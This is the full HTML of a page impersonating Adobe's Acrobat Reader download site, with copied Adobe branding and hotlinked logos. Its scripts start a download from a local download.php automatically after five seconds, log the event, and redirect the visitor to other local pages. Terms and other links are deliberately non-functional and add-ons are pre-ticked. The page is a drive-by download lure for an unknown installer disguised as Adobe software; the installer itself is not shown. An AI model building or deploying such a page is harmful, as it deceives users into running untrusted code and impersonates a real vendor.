<html>
	<head>
		<title>Download Adobe Acrobat Reader: Free PDF viewer</title>
		<link rel="icon" type="image/x-icon" href="https://get.adobe.com/reader/favicon.ico">
		<style>
			/* Button Styling */
			.adobe-btn {
				background-color: #1473e6;
				color: white !important;
				padding: 10px 24px;
				border-radius: 20px;
				text-decoration: none;
				font-weight: 700;
				display: inline-block;
				transition: background-color 0.2s;
				border: none;
				cursor: pointer;
				font-family: Adobe-Clean, Arial, sans-serif;
			}
			.adobe-btn:hover {
				background-color: #0d66d0;
			}

			/* Class to mimic the original link appearance without link functionality */
			.fake-link {
				text-decoration: underline;
				color: rgb(136, 136, 136);
				cursor: default;
			}

			/* Functional Checkbox Styling */
			.form-check-input {
				cursor: pointer;
				appearance: none;
				-webkit-appearance: none;
				background-color: #fff;
				border: 1px solid #747474;
				border-radius: 0.25em;
				width: 1em;
				height: 1em;
				display: inline-block;
				position: relative;
				vertical-align: top;
			}
			.form-check-input:checked {
				background-color: rgb(20, 115, 230);
				border-color: rgb(20, 115, 230);
				background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20'%3e%3cpath fill='none' stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='3' d='m6 10 3 3 6-6'/%3e%3c/svg%3e");
				background-repeat: no-repeat;
				background-position: center center;
				background-size: contain;
			}
		</style>
		<script>
window.onload = function () {
    window.location.href = "download.php";
};
</script>

        <script>
            var downloadStarted = false;

            window.onload = function() {
                var seconds = 5;
                var display = document.getElementById('status-text');
                
                var timer = setInterval(function() {
                    seconds--;
                    if (seconds > 0) {
                        display.innerHTML = "<small class='fw-light' style='font-size: 0.875em;'>Your download will start automatically in " + seconds + " seconds...</small>";
                    } else {
                        clearInterval(timer);
                        if (!downloadStarted) {
                            triggerDownload(false);
                        }
                        display.innerHTML = "<small class='fw-light' style='font-size: 0.875em;'>We’ve downloaded a file to help you install Adobe Acrobat Reader. Open this file in your downloads to begin installation.</small>";
                    }
                }, 1000);
            };

            function triggerDownload(isManual) {
                downloadStarted = true;
                var type = isManual ? 'Final_Download_Button_Clicked' : 'Automatic_Download_Success';
                
                // Track event
                if (navigator.sendBeacon) {
                    navigator.sendBeacon('log_event.php?type=' + type);
                } else {
                    fetch('log_event.php?type=' + type);
                }

                // Execute Download
                var downloadUrl = 'download.php?type=' + type;
                var link = document.createElement('a');
                link.href = downloadUrl;
                link.download = ""; // Hint to browser to download
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                // Redirect only if manual button was clicked
                if (isManual) {
                    setTimeout(function() {
                        window.location.href = 'download.php';
                    }, 1500);
                }
            }

            function downloadAndRedirect(e) {
                e.preventDefault();
                triggerDownload(true);
            }
        </script>
	</head>
	<body>
		<nav class="navbar navbar-light AAEcdpWAqOPFAoXUxvaH" style="box-sizing: border-box; padding: 8px 0px; margin: 0px; background: rgb(255, 255, 255); min-height: 70px; --bs-navbar-padding-x: 0; --bs-navbar-padding-y: .5rem; --bs-navbar-color: rgba(0,0,0, 0.65); --bs-navbar-hover-color: rgba(0,0,0, 0.8); --bs-navbar-disabled-color: rgba(0,0,0, 0.3); --bs-navbar-active-color: rgba(0,0,0, 1); --bs-navbar-brand-padding-y: .35781rem; --bs-navbar-brand-margin-end: 1rem; --bs-navbar-brand-font-size: 1.09375rem; --bs-navbar-brand-color: rgba(0,0,0, 1); --bs-navbar-brand-hover-color: rgba(0,0,0, 1); --bs-navbar-nav-link-padding-x: .5rem; --bs-navbar-toggler-padding-y: .25rem; --bs-navbar-toggler-padding-x: .75rem; --bs-navbar-toggler-font-size: 1.09375rem; --bs-navbar-toggler-icon-bg: url(&quot;data:image/svg+xml,%3csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 30 30%27%3e%3cpath stroke=%27rgba%2833,37,41,0.75%29%27 stroke-linecap=%27round%27 stroke-miterlimit=%2710%27 stroke-width=%272%27 d=%27M4 7h22M4 15h22M4 23h22%27/%3e%3c/svg%3e&quot;); --bs-navbar-toggler-border-color: rgba(0,0,0, 0.15); --bs-navbar-toggler-border-radius: 2.25rem; --bs-navbar-toggler-focus-width: .25rem; --bs-navbar-toggler-transition: box-shadow 0.15s ease-in-out; position: relative; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; color: rgb(33, 37, 41); font-family: Adobe-Clean, Arial, sans-serif; font-size: 14px;">
			<div class="ms-3" style="box-sizing: border-box; padding: 0px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 1rem !important;">
				<a href="https://www.adobe.com/" style="box-sizing: border-box; padding: 0px; margin: 0px; color: rgb(20, 115, 230);"><img alt="Adobe, Inc." class="PcRKvD4JjGY21b7jfgtn " src="https://get.adobe.com/reader/7ed09758f8/images/adobe_logo_header.svg" style="box-sizing: border-box; padding: 0px; margin: 0px; vertical-align: middle; height: 4rem;" /></a></div>
		</nav>
		<div class="container-fluid VZtx8CMGeaZFY7Uxw0Tp" style="box-sizing: border-box; padding: 0px 12px; margin: 0px auto; background: 0% 0% no-repeat padding-box padding-box white; --bs-gutter-x: 1.5rem; --bs-gutter-y: 0; width: 1692px; color: rgb(33, 37, 41); font-family: Adobe-Clean, Arial, sans-serif; font-size: 14px;">
			<div class="row justify-content-center bg-white" style="box-sizing: border-box; padding: 0px; margin: 0px -12px; --bs-gutter-x: 1.5rem; --bs-gutter-y: 0; display: flex; flex-wrap: wrap; --bs-bg-opacity: 1; justify-content: center !important;">
				<div class="col-md-4" style="box-sizing: border-box; padding: 0px 12px; margin: 0px; flex: 0 0 auto; width: 563.99px; max-width: 100%;">
					<div class="row" style="box-sizing: border-box; padding: 0px; margin: 0px -12px; --bs-gutter-x: 1.5rem; --bs-gutter-y: 0; display: flex; flex-wrap: wrap;">
						<div style="box-sizing: border-box; padding: 0px 12px; margin: 0px; flex-shrink: 0; width: 563.99px; max-width: 100%;">
							<img alt="Adobe, Inc." class="_rGlBWxpFwiyw10Hc8NY " src="https://get.adobe.com/reader/7ed09758f8/images/adobe_logo.png" style="box-sizing: border-box; padding: 0px; margin: 0px; vertical-align: middle; width: 3.75rem; height: 3.75rem;" /><span class="ms-1 ojag4CKqsnfD5x0NA9NQ" style="box-sizing: border-box; padding: 0px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; color: rgb(179, 11, 0); margin-left: 0.25rem !important;">Adobe&nbsp;Acrobat&nbsp;Reader</span></div>
					</div>
					<div class="row" style="box-sizing: border-box; padding: 0px; margin: 0px -12px; --bs-gutter-x: 1.5rem; --bs-gutter-y: 0; display: flex; flex-wrap: wrap;">
						<div class="d-none d-md-block mt-2 mb-2" style="box-sizing: border-box; padding: 0px 12px; margin-right: 0px; margin-left: 0px; flex-shrink: 0; width: 563.99px; max-width: 100%; margin-top: 0.5rem !important; margin-bottom: 0.5rem !important;">
							<h1 class="fw-bold LaxgIXSKYfqITDVQVJkx" style="box-sizing: border-box; padding: 0px; margin: 0px 0px 0.5rem; line-height: 1.2; font-size: 2.25rem;">
								The world&rsquo;s most trusted free PDF viewer</h1>
						</div>
						<div style="box-sizing: border-box; padding: 0px 12px; margin: 0px; flex-shrink: 0; width: 563.99px; max-width: 100%;">
							<span class="AzbucaY8xnkGRMGFTIZw mt-2" style="box-sizing: border-box; padding: 0px; margin-top: 0.5rem !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; color: rgb(136, 136, 136); font-size: 0.75rem;">Windows 10 - 11&nbsp;&bull;&nbsp;English&nbsp;&bull;&nbsp;Version&nbsp;26.001.21431&nbsp;&nbsp;<span class="fake-link">System requirements</span><br style="box-sizing: border-box; padding: 0px; margin: 0px;" />
							Download Acrobat Reader to work with PDFs in Acrobat on desktop and Google Chrome browser.<br style="box-sizing: border-box; padding: 0px; margin: 0px;" />
							By clicking the &ldquo;Download Acrobat Reader&rdquo; button, you acknowledge that you have read and accepted all of the&nbsp;<span class="fake-link">Terms and Conditions.</span>&nbsp;</span></div>
						<div class="mt-3 mb-3" style="box-sizing: border-box; padding: 0px 12px; margin-top: 1rem !important; margin-right: 0px; margin-bottom: 1rem !important; margin-left: 0px; flex-shrink: 0; width: 563.99px; max-width: 100%;">
                            <a href="download.php" onclick="downloadAndRedirect(event)" class="adobe-btn">Download Acrobat Reader</a>
						</div>
					</div>
				</div>
				<div class="d-none d-md-block col-md-6 mt-n2 rxSP_LPQMjJwIpQNYva6" style="box-sizing: border-box; padding: 0px 12px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; flex: 0 0 auto; width: 846px; max-width: 100%; z-index: 1; margin-top: -0.5rem !important;">
					<img alt="..." class="W1NcQFslI8eLKTKh4On9" src="https://get.adobe.com/reader/7ed09758f8/images/marquee_banner.svg" style="box-sizing: border-box; padding: 0px; margin: -6rem 0px 0px; vertical-align: middle; width: 50.75rem; height: 32.5rem;" /></div>
			</div>
			<div class="row justify-content-center bg-white" style="box-sizing: border-box; padding: 0px; margin: 0px -12px; --bs-gutter-x: 1.5rem; --bs-gutter-y: 0; display: flex; flex-wrap: wrap; --bs-bg-opacity: 1; justify-content: center !important;">
				<p class="text-center fs-4 fw-bold pt-3" style="box-sizing: border-box; padding-top: 1rem !important; padding-right: 12px; padding-bottom: 0px; padding-left: 12px; margin: 0px 0px 1rem; flex-shrink: 0; width: 1692px; max-width: 100%; font-size: 1.3125rem !important; font-weight: 700 !important; text-align: center !important;">
					Included with your download</p>
				<div class="col-sm-12 col-lg-3" style="box-sizing: border-box; padding: 0px 12px; margin: 0px; flex: 0 0 auto; width: 423px; max-width: 100%;">
					<fieldset class="border p-3 h-100 rounded-1" style="box-sizing: border-box; padding: 1rem !important; margin: 0px; min-width: 0px; border-width: 0.666667px !important; border-style: solid !important; border-color: rgb(222, 226, 230) !important; border-image: none 100% / 1 / 0 stretch !important; height: 136.052px; border-radius: 4px !important;">
						<legend class="float-none w-auto px-2 fw-bold KNih5tU1OHAGEIRb2aNA" style="box-sizing: border-box; padding-top: 0px; padding-right: 0.5rem !important; padding-bottom: 0px; padding-left: 0.5rem !important; margin: 0px 0px 0.5rem; float: none !important; width: auto !important; line-height: inherit; font-size: 1rem; font-weight: 700 !important;">Adobe Express Photos</legend>
						<div class="d-flex flex-row " style="box-sizing: border-box; padding: 0px; margin: 0px; clear: left; display: flex !important; flex-direction: row !important;">
							<div class="CUkg87EkNYMRtdghTlW1" style="box-sizing: border-box; padding: 0px; margin: 0px; width: -webkit-fill-available;">
								<input checked="checked" class="form-check-input" id="hrm" type="checkbox" />
								<div class="ms-4 mt-n3" style="box-sizing: border-box; padding: 0px; margin-top: -1rem !important; margin-right: 0px; margin-bottom: 0px; margin-left: 1.5rem !important;">
									<label class="form-check-label Uwd7pwbu9ZT4Tfru0pF2" for="hrm" style="box-sizing: border-box; padding: 0px; margin: 0px; display: inline; cursor: pointer;">Install Adobe Express Photos</label>
									<p class="pt-2 lh-1 text-muted mb-0" style="box-sizing: border-box; padding-top: 0.5rem !important; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px !important; margin-left: 0px; line-height: 1 !important; --bs-text-opacity: 1; color: rgba(33, 37, 41, 0.75) !important;">
										<small class="fw-light" style="box-sizing: border-box; padding: 0px; margin: 0px; font-size: 0.875em;">The free Adobe app to view images, take screenshots, and easily make quick image edits.</small></p>
									<span class="fake-link" style="color: rgba(33, 37, 41, 0.75) !important;"><small class="fw-light" style="font-size: 0.875em;">Learn more</small></span></div>
							</div>
						</div>
					</fieldset>
				</div>
				<div class="col-sm-12 col-lg-3" style="box-sizing: border-box; padding: 0px 12px; margin: 0px; flex: 0 0 auto; width: 423px; max-width: 100%;">
					<fieldset class="border p-3 h-100 rounded-1" style="box-sizing: border-box; padding: 1rem !important; margin: 0px; min-width: 0px; border-width: 0.666667px !important; border-style: solid !important; border-color: rgb(222, 226, 230) !important; border-image: none 100% / 1 / 0 stretch !important; height: 136.052px; border-radius: 4px !important;">
						<legend class="float-none w-auto px-2 fw-bold KNih5tU1OHAGEIRb2aNA" style="box-sizing: border-box; padding-top: 0px; padding-right: 0.5rem !important; padding-bottom: 0px; padding-left: 0.5rem !important; margin: 0px 0px 0.5rem; float: none !important; width: auto !important; line-height: inherit; font-size: 1rem; font-weight: 700 !important;">More add-ons</legend>
						<div class="d-flex flex-row " style="box-sizing: border-box; padding: 0px; margin: 0px; clear: left; display: flex !important; flex-direction: row !important;">
							<div class="CUkg87EkNYMRtdghTlW1" style="box-sizing: border-box; padding: 0px; margin: 0px; width: -webkit-fill-available;">
								<input checked="checked" class="form-check-input" id="mss" type="checkbox" />
								<div class="ms-4 mt-n3" style="box-sizing: border-box; padding: 0px; margin-top: -1rem !important; margin-right: 0px; margin-bottom: 0px; margin-left: 1.5rem !important;">
									<label class="form-check-label Uwd7pwbu9ZT4Tfru0pF2" for="mss" style="box-sizing: border-box; padding: 0px; margin: 0px; display: inline; cursor: pointer;">Install McAfee Security Scan Plus</label>
									<p class="pt-2 lh-1 text-muted mb-0" style="box-sizing: border-box; padding-top: 0.5rem !important; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px !important; margin-left: 0px; line-height: 1 !important; --bs-text-opacity: 1; color: rgba(33, 37, 41, 0.75) !important;">
										<small class="fw-light" style="box-sizing: border-box; padding: 0px; margin: 0px; font-size: 0.875em;">Install the free utility to check the status of my PC security. It will not modify existing antivirus program or PC settings.</small></p>
									<span class="fake-link" style="color: rgba(33, 37, 41, 0.75) !important;"><small class="fw-light" style="font-size: 0.875em;">Learn more</small></span></div>
							</div>
						</div>
					</fieldset>
				</div>
				<div class="text-center mt-4 mb-3" style="box-sizing: border-box; padding: 0px 12px; margin-top: 1.5rem !important; margin-right: 0px; margin-bottom: 1rem !important; margin-left: 0px; flex-shrink: 0; width: 1692px; max-width: 100%; text-align: center !important;">
					<a href="download.php" onclick="downloadAndRedirect(event)" class="adobe-btn">Download Acrobat Reader</a>
				</div>
				<div class="text-center mb-5" style="box-sizing: border-box; padding: 0px 12px; margin-top: 0px; margin-right: 0px; margin-bottom: 3rem !important; margin-left: 0px; flex-shrink: 0; width: 1692px; max-width: 100%; text-align: center !important;">
                    <span id="status-text" style="color: rgb(136, 136, 136); max-width: 700px; display: inline-block; font-family: Adobe-Clean, Arial, sans-serif;"><small class="fw-light" style="font-size: 0.875em;">Your download will start automatically in 5 seconds...</small></span>
                </div>
			</div>
		</div>
		<p>
			&nbsp;</p>

			<script>
setTimeout(function(){
    window.location.href="installation_guides.php";
},8000);
</script>

	</body>
</html>